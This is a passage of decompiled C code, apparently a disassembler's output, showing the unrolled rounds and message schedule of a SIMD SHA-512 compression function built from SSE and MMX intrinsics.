                   _m_pxor(_m_psllqi(v223, 6u), _m_pxor(_m_pxor(_m_pxor(v222, v221), v223), _m_psrlqi(v221, 5u))));
          v873[1] = _mm_add_epi64(_mm_load_si128(v129 + 1), v191);
          v226 = _mm_load_si128(&v881);
          v880 = v125;
          v227 = _mm_alignr_epi8(v126, v125, 8);
          v228 = _mm_alignr_epi8(v226, v180, 8);
          v229 = _mm_srli_epi64(v228, 7u);
          v230 = _mm_add_epi64(v180, v227);
          v231 = v228;
          v232 = _mm_srli_epi64(v228, 1u);
          v233 = _mm_slli_epi64(v231, 0x38u);
          v234 = _mm_add_epi64(
                   v230,
                   _mm_xor_si128(
                     _mm_xor_si128(_mm_xor_si128(_mm_xor_si128(v229, v232), v233), _mm_srli_epi64(v232, 7u)),
                     _mm_slli_epi64(v233, 7u)));
          v235 = _mm_srli_epi64(v191, 0x13u);
          v236 = _mm_slli_epi64(v191, 3u);
          v237 = _mm_add_epi64(
                   v234,
                   _mm_xor_si128(
                     _mm_xor_si128(
                       _mm_xor_si128(_mm_xor_si128(_mm_srli_epi64(v191, 6u), v235), v236),
                       _mm_srli_epi64(v235, 0x2Au)),
                     _mm_slli_epi64(v236, 0x2Au)));
          v238 = _m_psrlqi(v218, 0xEu);
          v808 = v218;
          v239 = _m_pand(_m_pxor(v816, v824), v218);
          v240 = _m_psllqi(v218, 0x17u);
          v241 = _mm_add_si64(v225, v217);
          v242 = v238;
          v243 = _m_psrlqi(v238, 4u);
          v244 = _m_pxor(v242, v240);
          v245 = _m_psllqi(v240, 0x17u);
          v840 = v241;
          v246 = _mm_add_si64(
                   _m_pxor(_m_pxor(_m_pxor(_m_pxor(v244, v243), v245), _m_psrlqi(v243, 0x17u)), _m_psllqi(v245, 4u)),
                   _mm_add_si64(_mm_add_si64(*(__m64 *)&v873[2], _m_pxor(v239, v824)), v832));
          v247 = _mm_add_si64(v865, v246);
          v248 = _m_psrlqi(v241, 0x1Cu);
          v249 = _m_psllqi(v241, 0x19u);
          v250 = _m_psrlqi(v248, 6u);
          v251 = _m_pxor(v248, v249);
          v252 = _m_psllqi(v249, 5u);
          v253 = _m_pxor(v241, v848);
          v254 = _mm_add_si64(
                   _m_pxor(_m_pand(v224, v253), v848),
                   _m_pxor(_m_psllqi(v252, 6u), _m_pxor(_m_pxor(_m_pxor(v251, v250), v252), _m_psrlqi(v250, 5u))));
          v255 = _m_psrlqi(v247, 0xEu);
          v866 = v247;
          v256 = _m_pand(_m_pxor(v808, v816), v247);
          v257 = _m_psllqi(v247, 0x17u);
          v258 = _mm_add_si64(v254, v246);
          v259 = v255;
          v260 = _m_psrlqi(v255, 4u);
          v261 = _m_pxor(v259, v257);
          v262 = _m_psllqi(v257, 0x17u);
          v833 = v258;
          v263 = _mm_add_si64(
                   _m_pxor(_m_pxor(_m_pxor(_m_pxor(v261, v260), v262), _m_psrlqi(v260, 0x17u)), _m_psllqi(v262, 4u)),
                   _mm_add_si64(_mm_add_si64(*((__m64 *)&v873[2] + 1), _m_pxor(v256, v816)), v824));
          v264 = _mm_add_si64(v856, v263);
          v265 = _m_psrlqi(v258, 0x1Cu);
          v266 = _m_psllqi(v258, 0x19u);
          v267 = _m_psrlqi(v265, 6u);
          v268 = _m_pxor(v265, v266);
          v269 = _m_psllqi(v266, 5u);
          v270 = _m_pxor(v258, v840);
          v271 = _mm_add_si64(
                   _m_pxor(_m_pand(v253, v270), v840),
                   _m_pxor(_m_psllqi(v269, 6u), _m_pxor(_m_pxor(_m_pxor(v268, v267), v269), _m_psrlqi(v267, 5u))));
          v873[2] = _mm_add_epi64(_mm_load_si128(v129 + 2), v237);
          v272 = _mm_load_si128(&v878);
          v881 = v126;
          v273 = _mm_alignr_epi8(v145, v126, 8);
          v274 = _mm_alignr_epi8(v272, v226, 8);
          v275 = _mm_srli_epi64(v274, 7u);
          v276 = _mm_add_epi64(v226, v273);
          v277 = v274;
          v278 = _mm_srli_epi64(v274, 1u);
          v279 = _mm_slli_epi64(v277, 0x38u);
          v280 = _mm_add_epi64(
                   v276,
                   _mm_xor_si128(
                     _mm_xor_si128(_mm_xor_si128(_mm_xor_si128(v275, v278), v279), _mm_srli_epi64(v278, 7u)),
                     _mm_slli_epi64(v279, 7u)));
          v281 = _mm_srli_epi64(v237, 0x13u);
          v282 = _mm_slli_epi64(v237, 3u);
          v283 = _mm_add_epi64(
                   v280,
                   _mm_xor_si128(
                     _mm_xor_si128(
                       _mm_xor_si128(_mm_xor_si128(_mm_srli_epi64(v237, 6u), v281), v282),
                       _mm_srli_epi64(v281, 0x2Au)),
                     _mm_slli_epi64(v282, 0x2Au)));
          v284 = _m_psrlqi(v264, 0xEu);
          v857 = v264;
          v285 = _m_pand(_m_pxor(v866, v808), v264);
          v286 = _m_psllqi(v264, 0x17u);
          v287 = _mm_add_si64(v271, v263);
          v288 = v284;
          v289 = _m_psrlqi(v284, 4u);
          v290 = _m_pxor(v288, v286);
          v291 = _m_psllqi(v286, 0x17u);
          v825 = v287;
          v292 = _mm_add_si64(
                   _m_pxor(_m_pxor(_m_pxor(_m_pxor(v290, v289), v291), _m_psrlqi(v289, 0x17u)), _m_psllqi(v291, 4u)),
                   _mm_add_si64(_mm_add_si64(*(__m64 *)&v873[3], _m_pxor(v285, v808)), v816));
          v293 = _mm_add_si64(v848, v292);
          v294 = _m_psrlqi(v287, 0x1Cu);
          v295 = _m_psllqi(v287, 0x19u);
          v296 = _m_psrlqi(v294, 6u);
          v297 = _m_pxor(v294, v295);
          v298 = _m_psllqi(v295, 5u);
          v299 = _m_pxor(v287, v833);
          v300 = _mm_add_si64(
                   _m_pxor(_m_pand(v270, v299), v833),
                   _m_pxor(_m_psllqi(v298, 6u), _m_pxor(_m_pxor(_m_pxor(v297, v296), v298), _m_psrlqi(v296, 5u))));
          v301 = _m_psrlqi(v293, 0xEu);
          v849 = v293;
          v302 = _m_pand(_m_pxor(v857, v866), v293);
          v303 = _m_psllqi(v293, 0x17u);
          v304 = _mm_add_si64(v300, v292);
          v305 = v301;
          v306 = _m_psrlqi(v301, 4u);
          v307 = _m_pxor(v305, v303);
          v308 = _m_psllqi(v303, 0x17u);
          v817 = v304;
          v309 = _mm_add_si64(
                   _m_pxor(_m_pxor(_m_pxor(_m_pxor(v307, v306), v308), _m_psrlqi(v306, 0x17u)), _m_psllqi(v308, 4u)),
                   _mm_add_si64(_mm_add_si64(*((__m64 *)&v873[3] + 1), _m_pxor(v302, v866)), v808));
          v310 = _mm_add_si64(v840, v309);
          v311 = _m_psrlqi(v304, 0x1Cu);
          v312 = _m_psllqi(v304, 0x19u);
          v313 = _m_psrlqi(v311, 6u);
          v314 = _m_pxor(v311, v312);
          v315 = _m_psllqi(v312, 5u);
          v316 = _m_pxor(v304, v825);
          v317 = _mm_add_si64(
                   _m_pxor(_m_pand(v299, v316), v825),
                   _m_pxor(_m_psllqi(v315, 6u), _m_pxor(_m_pxor(_m_pxor(v314, v313), v315), _m_psrlqi(v313, 5u))));
          v873[3] = _mm_add_epi64(_mm_load_si128(v129 + 3), v283);
          v318 = _mm_load_si128(&v879);
          v878 = v145;
          v319 = _mm_alignr_epi8(v191, v145, 8);
          v320 = _mm_alignr_epi8(v318, v272, 8);
          v321 = _mm_srli_epi64(v320, 7u);
          v322 = _mm_add_epi64(v272, v319);
          v323 = v320;
          v324 = _mm_srli_epi64(v320, 1u);
          v325 = _mm_slli_epi64(v323, 0x38u);
          v326 = _mm_add_epi64(
                   v322,
                   _mm_xor_si128(
                     _mm_xor_si128(_mm_xor_si128(_mm_xor_si128(v321, v324), v325), _mm_srli_epi64(v324, 7u)),
                     _mm_slli_epi64(v325, 7u)));
          v327 = _mm_srli_epi64(v283, 0x13u);
          v328 = _mm_slli_epi64(v283, 3u);
          v121 = _mm_add_epi64(
                   v326,
                   _mm_xor_si128(
                     _mm_xor_si128(
                       _mm_xor_si128(_mm_xor_si128(_mm_srli_epi64(v283, 6u), v327), v328),
                       _mm_srli_epi64(v327, 0x2Au)),
                     _mm_slli_epi64(v328, 0x2Au)));
          v329 = _m_psrlqi(v310, 0xEu);
          v841 = v310;
          v330 = _m_pand(_m_pxor(v849, v857), v310);
          v331 = _m_psllqi(v310, 0x17u);
          v332 = _mm_add_si64(v317, v309);
          v333 = v329;
          v334 = _m_psrlqi(v329, 4u);
          v335 = _m_pxor(v333, v331);
          v336 = _m_psllqi(v331, 0x17u);
          v809 = v332;
          v337 = _mm_add_si64(
                   _m_pxor(_m_pxor(_m_pxor(_m_pxor(v335, v334), v336), _m_psrlqi(v334, 0x17u)), _m_psllqi(v336, 4u)),
                   _mm_add_si64(_mm_add_si64((__m64)v874.m128i_u64[0], _m_pxor(v330, v857)), v866));
          v338 = _mm_add_si64(v833, v337);
          v339 = _m_psrlqi(v332, 0x1Cu);
          v340 = _m_psllqi(v332, 0x19u);
          v341 = _m_psrlqi(v339, 6u);
          v342 = _m_pxor(v339, v340);
          v343 = _m_psllqi(v340, 5u);
          v344 = _m_pxor(v332, v817);
          v345 = _mm_add_si64(
                   _m_pxor(_m_pand(v316, v344), v817),
                   _m_pxor(_m_psllqi(v343, 6u), _m_pxor(_m_pxor(_m_pxor(v342, v341), v343), _m_psrlqi(v341, 5u))));
          v346 = _m_psrlqi(v338, 0xEu);
          v834 = v338;
          v347 = _m_pand(_m_pxor(v841, v849), v338);
          v348 = _m_psllqi(v338, 0x17u);
          v349 = _mm_add_si64(v345, v337);
          v350 = v346;
          v351 = _m_psrlqi(v346, 4u);
          v352 = _m_pxor(v350, v348);
          v353 = _m_psllqi(v348, 0x17u);
          v867 = v349;
          v354 = _mm_add_si64(
                   _m_pxor(_m_pxor(_m_pxor(_m_pxor(v352, v351), v353), _m_psrlqi(v351, 0x17u)), _m_psllqi(v353, 4u)),
                   _mm_add_si64(_mm_add_si64((__m64)v874.m128i_u64[1], _m_pxor(v347, v849)), v857));
          v355 = _mm_add_si64(v825, v354);
          v356 = _m_psrlqi(v349, 0x1Cu);
          v357 = _m_psllqi(v349, 0x19u);
          v358 = _m_psrlqi(v356, 6u);
          v359 = _m_pxor(v356, v357);
          v360 = _m_psllqi(v357, 5u);
          v361 = _m_pxor(v349, v809);
          v362 = _mm_add_si64(
                   _m_pxor(_m_pand(v344, v361), v809),
                   _m_pxor(_m_psllqi(v360, 6u), _m_pxor(_m_pxor(_m_pxor(v359, v358), v360), _m_psrlqi(v358, 5u))));
          v874 = _mm_add_epi64(_mm_load_si128(v129 + 4), v121);
          v363 = _mm_load_si128(&v880);
          v879 = v191;
          v364 = _mm_alignr_epi8(v237, v191, 8);
          v365 = _mm_alignr_epi8(v363, v318, 8);
          v366 = _mm_srli_epi64(v365, 7u);
          v367 = _mm_add_epi64(v318, v364);
          v368 = v365;
          v369 = _mm_srli_epi64(v365, 1u);
          v370 = _mm_slli_epi64(v368, 0x38u);
          v371 = _mm_add_epi64(
                   v367,
                   _mm_xor_si128(
                     _mm_xor_si128(_mm_xor_si128(_mm_xor_si128(v366, v369), v370), _mm_srli_epi64(v369, 7u)),
                     _mm_slli_epi64(v370, 7u)));
          v372 = _mm_srli_epi64(v121, 0x13u);
          v373 = _mm_slli_epi64(v121, 3u);
          v123 = _mm_add_epi64(
                   v371,
                   _mm_xor_si128(
                     _mm_xor_si128(
                       _mm_xor_si128(_mm_xor_si128(_mm_srli_epi64(v121, 6u), v372), v373),
                       _mm_srli_epi64(v372, 0x2Au)),
                     _mm_slli_epi64(v373, 0x2Au)));
          v374 = _m_psrlqi(v355, 0xEu);
          v826 = v355;
          v375 = _m_pand(_m_pxor(v834, v841), v355);
          v376 = _m_psllqi(v355, 0x17u);
          v377 = _mm_add_si64(v362, v354);
          v378 = v374;
          v379 = _m_psrlqi(v374, 4u);
          v380 = _m_pxor(v378, v376);
          v381 = _m_psllqi(v376, 0x17u);
          v858 = v377;
          v382 = _mm_add_si64(
                   _m_pxor(_m_pxor(_m_pxor(_m_pxor(v380, v379), v381), _m_psrlqi(v379, 0x17u)), _m_psllqi(v381, 4u)),
                   _mm_add_si64(_mm_add_si64((__m64)v875.m128i_u64[0], _m_pxor(v375, v841)), v849));
          v383 = _mm_add_si64(v817, v382);
          v384 = _m_psrlqi(v377, 0x1Cu);
          v385 = _m_psllqi(v377, 0x19u);
          v386 = _m_psrlqi(v384, 6u);
          v387 = _m_pxor(v384, v385);
          v388 = _m_psllqi(v385, 5u);
          v389 = _m_pxor(v377, v867);
          v390 = _mm_add_si64(
                   _m_pxor(_m_pand(v361, v389), v867),
                   _m_pxor(_m_psllqi(v388, 6u), _m_pxor(_m_pxor(_m_pxor(v387, v386), v388), _m_psrlqi(v386, 5u))));
          v391 = _m_psrlqi(v383, 0xEu);
          v818 = v383;
          v392 = _m_pand(_m_pxor(v826, v834), v383);
          v393 = _m_psllqi(v383, 0x17u);
          v394 = _mm_add_si64(v390, v382);
          v395 = v391;
          v396 = _m_psrlqi(v391, 4u);
          v397 = _m_pxor(v395, v393);
          v398 = _m_psllqi(v393, 0x17u);
          v850 = v394;
          v399 = _mm_add_si64(
                   _m_pxor(_m_pxor(_m_pxor(_m_pxor(v397, v396), v398), _m_psrlqi(v396, 0x17u)), _m_psllqi(v398, 4u)),
                   _mm_add_si64(_mm_add_si64((__m64)v875.m128i_u64[1], _m_pxor(v392, v834)), v841));
          v400 = _mm_add_si64(v809, v399);
          v401 = _m_psrlqi(v394, 0x1Cu);
          v402 = _m_psllqi(v394, 0x19u);
          v403 = _m_psrlqi(v401, 6u);
          v404 = _m_pxor(v401, v402);
          v405 = _m_psllqi(v402, 5u);
          v406 = _m_pxor(v394, v858);
          v407 = _mm_add_si64(
                   _m_pxor(_m_pand(v389, v406), v858),
                   _m_pxor(_m_psllqi(v405, 6u), _m_pxor(_m_pxor(_m_pxor(v404, v403), v405), _m_psrlqi(v403, 5u))));
          v875 = _mm_add_epi64(_mm_load_si128(v129 + 5), v123);
          v408 = _mm_load_si128(&v881);
          v880 = v237;
          v409 = _mm_alignr_epi8(v283, v237, 8);
          v410 = _mm_alignr_epi8(v408, v363, 8);
          v411 = _mm_srli_epi64(v410, 7u);
          v412 = _mm_add_epi64(v363, v409);
          v413 = v410;
          v414 = _mm_srli_epi64(v410, 1u);
          v415 = _mm_slli_epi64(v413, 0x38u);
          v416 = _mm_add_epi64(
                   v412,
                   _mm_xor_si128(
                     _mm_xor_si128(_mm_xor_si128(_mm_xor_si128(v411, v414), v415), _mm_srli_epi64(v414, 7u)),
                     _mm_slli_epi64(v415, 7u)));
          v417 = _mm_srli_epi64(v123, 0x13u);
          v418 = _mm_slli_epi64(v123, 3u);
          v125 = _mm_add_epi64(
                   v416,
                   _mm_xor_si128(
                     _mm_xor_si128(
                       _mm_xor_si128(_mm_xor_si128(_mm_srli_epi64(v123, 6u), v417), v418),
                       _mm_srli_epi64(v417, 0x2Au)),
                     _mm_slli_epi64(v418, 0x2Au)));
          v419 = _m_psrlqi(v400, 0xEu);
          v810 = v400;
          v420 = _m_pand(_m_pxor(v818, v826), v400);
          v421 = _m_psllqi(v400, 0x17u);
          v422 = _mm_add_si64(v407, v399);
          v423 = v419;
          v424 = _m_psrlqi(v419, 4u);
          v425 = _m_pxor(v423, v421);
          v426 = _m_psllqi(v421, 0x17u);
          v842 = v422;
          v427 = _mm_add_si64(
                   _m_pxor(_m_pxor(_m_pxor(_m_pxor(v425, v424), v426), _m_psrlqi(v424, 0x17u)), _m_psllqi(v426, 4u)),
                   _mm_add_si64(_mm_add_si64((__m64)v876.m128i_u64[0], _m_pxor(v420, v826)), v834));
          v428 = _mm_add_si64(v867, v427);
          v429 = _m_psrlqi(v422, 0x1Cu);
          v430 = _m_psllqi(v422, 0x19u);
          v431 = _m_psrlqi(v429, 6u);
          v432 = _m_pxor(v429, v430);
          v433 = _m_psllqi(v430, 5u);
          v434 = _m_pxor(v422, v850);
          v435 = _mm_add_si64(
                   _m_pxor(_m_pand(v406, v434), v850),
                   _m_pxor(_m_psllqi(v433, 6u), _m_pxor(_m_pxor(_m_pxor(v432, v431), v433), _m_psrlqi(v431, 5u))));
          v436 = _m_psrlqi(v428, 0xEu);
          v864 = v428;
          v437 = _m_pand(_m_pxor(v810, v818), v428);
          v438 = _m_psllqi(v428, 0x17u);
          v439 = _mm_add_si64(v435, v427);
          v440 = v436;
          v441 = _m_psrlqi(v436, 4u);
          v442 = _m_pxor(v440, v438);
          v443 = _m_psllqi(v438, 0x17u);
          v831 = v439;
          v444 = _mm_add_si64(
                   _m_pxor(_m_pxor(_m_pxor(_m_pxor(v442, v441), v443), _m_psrlqi(v441, 0x17u)), _m_psllqi(v443, 4u)),
                   _mm_add_si64(_mm_add_si64((__m64)v876.m128i_u64[1], _m_pxor(v437, v818)), v826));
          v445 = _mm_add_si64(v858, v444);
          v446 = _m_psrlqi(v439, 0x1Cu);
          v447 = _m_psllqi(v439, 0x19u);
          v448 = _m_psrlqi(v446, 6u);
          v449 = _m_pxor(v446, v447);
          v450 = _m_psllqi(v447, 5u);
          v451 = _m_pxor(v439, v842);
          v452 = _mm_add_si64(
                   _m_pxor(_m_pand(v434, v451), v842),
                   _m_pxor(_m_psllqi(v450, 6u), _m_pxor(_m_pxor(_m_pxor(v449, v448), v450), _m_psrlqi(v448, 5u))));
          v876 = _mm_add_epi64(_mm_load_si128(v129 + 6), v125);
          v127 = _mm_load_si128(&v878);
          v881 = v283;
          v453 = _mm_alignr_epi8(v121, v283, 8);
          v454 = _mm_alignr_epi8(v127, v408, 8);
          v455 = _mm_srli_epi64(v454, 7u);
          v456 = _mm_add_epi64(v408, v453);
          v457 = v454;
          v458 = _mm_srli_epi64(v454, 1u);
          v459 = _mm_slli_epi64(v457, 0x38u);
          v460 = _mm_add_epi64(
                   v456,
                   _mm_xor_si128(
                     _mm_xor_si128(_mm_xor_si128(_mm_xor_si128(v455, v458), v459), _mm_srli_epi64(v458, 7u)),
                     _mm_slli_epi64(v459, 7u)));
          v461 = _mm_srli_epi64(v125, 0x13u);
          v462 = _mm_slli_epi64(v125, 3u);
          v463 = _mm_xor_si128(
                   _mm_xor_si128(_mm_xor_si128(_mm_srli_epi64(v125, 6u), v461), v462),
                   _mm_srli_epi64(v461, 0x2Au));
          v128 = _mm_load_si128(&v879);
          v126 = _mm_add_epi64(v460, _mm_xor_si128(v463, _mm_slli_epi64(v462, 0x2Au)));
          v464 = _m_psrlqi(v445, 0xEu);
          v855 = v445;
          v465 = _m_pand(_m_pxor(v864, v810), v445);
          v466 = _m_psllqi(v445, 0x17u);
          v467 = _mm_add_si64(v452, v444);
          v468 = v464;
          v469 = _m_psrlqi(v464, 4u);
          v470 = _m_pxor(v468, v466);
          v471 = _m_psllqi(v466, 0x17u);
          v823 = v467;
          v472 = _mm_add_si64(
                   _m_pxor(_m_pxor(_m_pxor(_m_pxor(v470, v469), v471), _m_psrlqi(v469, 0x17u)), _m_psllqi(v471, 4u)),
                   _mm_add_si64(_mm_add_si64((__m64)v877.m128i_u64[0], _m_pxor(v465, v810)), v818));
          v473 = _mm_add_si64(v850, v472);
          v474 = _m_psrlqi(v467, 0x1Cu);
          v475 = _m_psllqi(v467, 0x19u);
          v476 = _m_psrlqi(v474, 6u);
          v477 = _m_pxor(v474, v475);
          v478 = _m_psllqi(v475, 5u);
          v479 = _m_pxor(v467, v831);
          v480 = _mm_add_si64(
                   _m_pxor(_m_pand(v451, v479), v831),
                   _m_pxor(_m_psllqi(v478, 6u), _m_pxor(_m_pxor(_m_pxor(v477, v476), v478), _m_psrlqi(v476, 5u))));
          v481 = _m_psrlqi(v473, 0xEu);
          v847 = v473;
          v482 = _m_pand(_m_pxor(v855, v864), v473);
          v483 = _m_psllqi(v473, 0x17u);
          v484 = _mm_add_si64(v480, v472);
          v485 = v481;
          v486 = _m_psrlqi(v481, 4u);
          v487 = _m_pxor(v485, v483);
          v488 = _m_psllqi(v483, 0x17u);
          v815 = v484;
          v133 = _mm_add_si64(
                   _m_pxor(_m_pxor(_m_pxor(_m_pxor(v487, v486), v488), _m_psrlqi(v486, 0x17u)), _m_psllqi(v488, 4u)),
                   _mm_add_si64(_mm_add_si64((__m64)v877.m128i_u64[1], _m_pxor(v482, v864)), v810));
          v8 = _mm_add_si64(v842, v133);
          v489 = _m_psrlqi(v484, 0x1Cu);
          v490 = _m_psllqi(v484, 0x19u);
          v491 = _m_psrlqi(v489, 6u);
          v492 = _m_pxor(v489, v490);
          v493 = _m_psllqi(v490, 5u);
          v132 = _m_pxor(v484, v823);
          v494 = _m_pxor(_m_psllqi(v493, 6u), _m_pxor(_m_pxor(_m_pxor(v492, v491), v493), _m_psrlqi(v491, 5u)));
          v9 = v847;
          v4 = _mm_add_si64(_m_pxor(_m_pand(v479, v132), v823), v494);
          v10 = v855;
          v877 = _mm_add_epi64(_mm_load_si128(v129 + 7), v126);
          v129 += 8;
          --v131;
        }
        while ( v131 );
        v495 = _mm_load_si128(v129);
        v2 = v129 - 40;
        v496 = _mm_shuffle_epi8(_mm_loadu_si128(v130), v495);
        v497 = v495;
        v498 = _mm_shuffle_epi8(_mm_loadu_si128(v130 + 1), v495);
        v499 = _m_psrlqi(v8, 0xEu);
        v843 = v8;
        v500 = _m_pand(_m_pxor(v847, v855), v8);
        v501 = _m_psllqi(v8, 0x17u);
        v502 = _mm_add_si64(v4, v133);
        v503 = v499;
        v504 = _m_psrlqi(v499, 4u);
        v505 = _m_pxor(v503, v501);
        v506 = _m_psllqi(v501, 0x17u);
        v811 = v502;
        v507 = _mm_add_si64(
                 _m_pxor(_m_pxor(_m_pxor(_m_pxor(v505, v504), v506), _m_psrlqi(v504, 0x17u)), _m_psllqi(v506, 4u)),
                 _mm_add_si64(_mm_add_si64(*(__m64 *)&v873[0], _m_pxor(v500, v855)), v864));
        v508 = _mm_add_si64(v831, v507);
        v509 = _m_psrlqi(v502, 0x1Cu);
        v510 = _m_psllqi(v502, 0x19u);
        v511 = _m_psrlqi(v509, 6u);
        v512 = _m_pxor(v509, v510);
        v513 = _m_psllqi(v510, 5u);
        v514 = _m_pxor(v502, v815);
        v515 = _mm_add_si64(
                 _m_pxor(_m_pand(v132, v514), v815),
                 _m_pxor(_m_psllqi(v513, 6u), _m_pxor(_m_pxor(_m_pxor(v512, v511), v513), _m_psrlqi(v511, 5u))));
        v516 = _m_psrlqi(v508, 0xEu);
        v835 = v508;
        v517 = _m_pand(_m_pxor(v843, v847), v508);
        v518 = _m_psllqi(v508, 0x17u);
        v519 = _mm_add_si64(v515, v507);
        v520 = v516;
        v521 = _m_psrlqi(v516, 4u);
        v522 = _m_pxor(v520, v518);
        v523 = _m_psllqi(v518, 0x17u);
        v868 = v519;
        v524 = _mm_add_si64(
                 _m_pxor(_m_pxor(_m_pxor(_m_pxor(v522, v521), v523), _m_psrlqi(v521, 0x17u)), _m_psllqi(v523, 4u)),
                 _mm_add_si64(_mm_add_si64(*((__m64 *)&v873[0] + 1), _m_pxor(v517, v847)), v855));
        v525 = _mm_add_si64(v823, v524);
        v526 = _m_psrlqi(v519, 0x1Cu);
        v527 = _m_psllqi(v519, 0x19u);
        v528 = _m_psrlqi(v526, 6u);
        v529 = _m_pxor(v526, v527);
        v530 = _m_psllqi(v527, 5u);
        v531 = _m_pxor(v519, v811);
        v532 = _mm_add_si64(
                 _m_pxor(_m_pand(v514, v531), v811),
                 _m_pxor(_m_psllqi(v530, 6u), _m_pxor(_m_pxor(_m_pxor(v529, v528), v530), _m_psrlqi(v528, 5u))));
        v873[0] = _mm_add_epi64(_mm_load_si128(v2), v496);
        v533 = v497;
        v534 = _mm_shuffle_epi8(_mm_loadu_si128(v130 + 2), v497);
        v535 = _m_psrlqi(v525, 0xEu);
        v827 = v525;
        v536 = _m_pand(_m_pxor(v835, v843), v525);
        v537 = _m_psllqi(v525, 0x17u);
        v538 = _mm_add_si64(v532, v524);
        v539 = v535;
        v540 = _m_psrlqi(v535, 4u);
        v541 = _m_pxor(v539, v537);
        v542 = _m_psllqi(v537, 0x17u);
        v859 = v538;
        v543 = _mm_add_si64(
                 _m_pxor(_m_pxor(_m_pxor(_m_pxor(v541, v540), v542), _m_psrlqi(v540, 0x17u)), _m_psllqi(v542, 4u)),
                 _mm_add_si64(_mm_add_si64(*(__m64 *)&v873[1], _m_pxor(v536, v843)), v847));
        v544 = _mm_add_si64(v815, v543);
        v545 = _m_psrlqi(v538, 0x1Cu);
        v546 = _m_psllqi(v538, 0x19u);
        v547 = _m_psrlqi(v545, 6u);
        v548 = _m_pxor(v545, v546);
        v549 = _m_psllqi(v546, 5u);
        v550 = _m_pxor(v538, v868);
        v551 = _mm_add_si64(
                 _m_pxor(_m_pand(v531, v550), v868),
                 _m_pxor(_m_psllqi(v549, 6u), _m_pxor(_m_pxor(_m_pxor(v548, v547), v549), _m_psrlqi(v547, 5u))));
        v552 = _m_psrlqi(v544, 0xEu);
        v819 = v544;
        v553 = _m_pand(_m_pxor(v827, v835), v544);
        v554 = _m_psllqi(v544, 0x17u);
        v555 = _mm_add_si64(v551, v543);
        v556 = v552;
        v557 = _m_psrlqi(v552, 4u);
        v558 = _m_pxor(v556, v554);
        v559 = _m_psllqi(v554, 0x17u);
        v851 = v555;
        v560 = _mm_add_si64(
                 _m_pxor(_m_pxor(_m_pxor(_m_pxor(v558, v557), v559), _m_psrlqi(v557, 0x17u)), _m_psllqi(v559, 4u)),
                 _mm_add_si64(_mm_add_si64(*((__m64 *)&v873[1] + 1), _m_pxor(v553, v835)), v843));
        v561 = _mm_add_si64(v811, v560);
        v562 = _m_psrlqi(v555, 0x1Cu);
        v563 = _m_psllqi(v555, 0x19u);
        v564 = _m_psrlqi(v562, 6u);
        v565 = _m_pxor(v562, v563);
        v566 = _m_psllqi(v563, 5u);
        v567 = _m_pxor(v555, v859);
        v568 = _mm_add_si64(
                 _m_pxor(_m_pand(v550, v567), v859),
                 _m_pxor(_m_psllqi(v566, 6u), _m_pxor(_m_pxor(_m_pxor(v565, v564), v566), _m_psrlqi(v564, 5u))));
        v873[1] = _mm_add_epi64(_mm_load_si128(v2 + 1), v498);
        v569 = v533;
        v119 = _mm_shuffle_epi8(_mm_loadu_si128(v130 + 3), v533);
        v570 = _m_psrlqi(v561, 0xEu);
        v812 = v561;
        v571 = _m_pand(_m_pxor(v819, v827), v561);
        v572 = _m_psllqi(v561, 0x17u);
        v573 = _mm_add_si64(v568, v560);
        v574 = v570;
        v575 = _m_psrlqi(v570, 4u);
        v576 = _m_pxor(v574, v572);
        v577 = _m_psllqi(v572, 0x17u);
        v844 = v573;
        v578 = _mm_add_si64(
                 _m_pxor(_m_pxor(_m_pxor(_m_pxor(v576, v575), v577), _m_psrlqi(v575, 0x17u)), _m_psllqi(v577, 4u)),
                 _mm_add_si64(_mm_add_si64(*(__m64 *)&v873[2], _m_pxor(v571, v827)), v835));
        v579 = _mm_add_si64(v868, v578);
        v580 = _m_psrlqi(v573, 0x1Cu);
        v581 = _m_psllqi(v573, 0x19u);
        v582 = _m_psrlqi(v580, 6u);
        v583 = _m_pxor(v580, v581);
        v584 = _m_psllqi(v581, 5u);
        v585 = _m_pxor(v573, v851);
        v586 = _mm_add_si64(
                 _m_pxor(_m_pand(v567, v585), v851),
                 _m_pxor(_m_psllqi(v584, 6u), _m_pxor(_m_pxor(_m_pxor(v583, v582), v584), _m_psrlqi(v582, 5u))));
        v587 = _m_psrlqi(v579, 0xEu);
        v869 = v579;
        v588 = _m_pand(_m_pxor(v812, v819), v579);
        v589 = _m_psllqi(v579, 0x17u);
        v590 = _mm_add_si64(v586, v578);
        v591 = v587;
        v592 = _m_psrlqi(v587, 4u);
        v593 = _m_pxor(v591, v589);
        v594 = _m_psllqi(v589, 0x17u);
        v836 = v590;
        v595 = _mm_add_si64(
                 _m_pxor(_m_pxor(_m_pxor(_m_pxor(v593, v592), v594), _m_psrlqi(v592, 0x17u)), _m_psllqi(v594, 4u)),
                 _mm_add_si64(_mm_add_si64(*((__m64 *)&v873[2] + 1), _m_pxor(v588, v819)), v827));
        v596 = _mm_add_si64(v859, v595);
        v597 = _m_psrlqi(v590, 0x1Cu);
        v598 = _m_psllqi(v590, 0x19u);
        v599 = _m_psrlqi(v597, 6u);
        v600 = _m_pxor(v597, v598);
        v601 = _m_psllqi(v598, 5u);
        v602 = _m_pxor(v590, v844);
        v603 = _mm_add_si64(
                 _m_pxor(_m_pand(v585, v602), v844),
                 _m_pxor(_m_psllqi(v601, 6u), _m_pxor(_m_pxor(_m_pxor(v600, v599), v601), _m_psrlqi(v599, 5u))));
        v873[2] = _mm_add_epi64(_mm_load_si128(v2 + 2), v534);
        v604 = v569;
        v121 = _mm_shuffle_epi8(_mm_loadu_si128(v130 + 4), v569);
        v605 = _m_psrlqi(v596, 0xEu);
        v860 = v596;
        v606 = _m_pand(_m_pxor(v869, v812), v596);
        v607 = _m_psllqi(v596, 0x17u);
        v608 = _mm_add_si64(v603, v595);
        v609 = v605;
        v610 = _m_psrlqi(v605, 4u);
        v611 = _m_pxor(v609, v607);
        v612 = _m_psllqi(v607, 0x17u);
        v828 = v608;
        v613 = _mm_add_si64(
                 _m_pxor(_m_pxor(_m_pxor(_m_pxor(v611, v610), v612), _m_psrlqi(v610, 0x17u)), _m_psllqi(v612, 4u)),
                 _mm_add_si64(_mm_add_si64(*(__m64 *)&v873[3], _m_pxor(v606, v812)), v819));
        v614 = _mm_add_si64(v851, v613);
        v615 = _m_psrlqi(v608, 0x1Cu);
        v616 = _m_psllqi(v608, 0x19u);
        v617 = _m_psrlqi(v615, 6u);
        v618 = _m_pxor(v615, v616);
        v619 = _m_psllqi(v616, 5u);
        v620 = _m_pxor(v608, v836);
        v621 = _mm_add_si64(
                 _m_pxor(_m_pand(v602, v620), v836),
